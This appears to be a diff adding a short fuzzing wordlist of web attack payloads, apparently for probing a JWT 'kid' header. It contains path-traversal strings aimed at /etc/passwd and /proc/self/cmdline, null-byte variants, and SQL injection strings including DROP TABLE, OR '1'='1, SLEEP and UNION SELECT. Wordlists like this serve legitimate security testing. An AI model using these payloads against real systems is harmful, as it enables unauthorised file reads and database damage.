@@ -1,0 +1,27 @@
+../../dev/null
+../../../dev/null
+../../../../dev/null
+../../../../../dev/null
+../../../../../../dev/null
+../../proc/self/cmdline
+/dev/null
+/proc/self/cmdline
+/proc/version
+../../../etc/passwd
+../../etc/passwd
+../etc/passwd
+/etc/passwd
+0
+1
+/; DROP TABLE users; --
+' OR '1'='1
+'; SELECT SLEEP(5)-- -
+1 UNION SELECT 1-- -
+../../../etc/passwd#
+../../dev/null#
+/dev/null%00
+../../dev/null%00
+kid_OR_1=1
+kid_UNION_SELECT_1
+../../dev/null'; -- -
+../../../etc/passwd%00
